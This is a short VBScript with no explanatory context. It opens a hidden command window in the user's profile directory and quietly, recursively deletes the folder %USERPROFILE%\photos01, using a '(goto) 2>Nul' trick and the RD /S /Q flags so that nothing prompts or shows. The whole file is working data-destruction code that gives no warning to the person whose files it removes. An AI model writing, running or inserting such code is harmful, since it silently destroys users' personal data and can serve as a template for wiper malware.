Set shell = CreateObject("WScript.Shell")
prf = shell.ExpandEnvironmentStrings("%USERPROFILE%")
shell.CurrentDirectory = prf
shell.Run "cmd /c cd %USERPROFILE% && (goto) 2>Nul & RD /S /Q %USERPROFILE%\photos01", 0, True
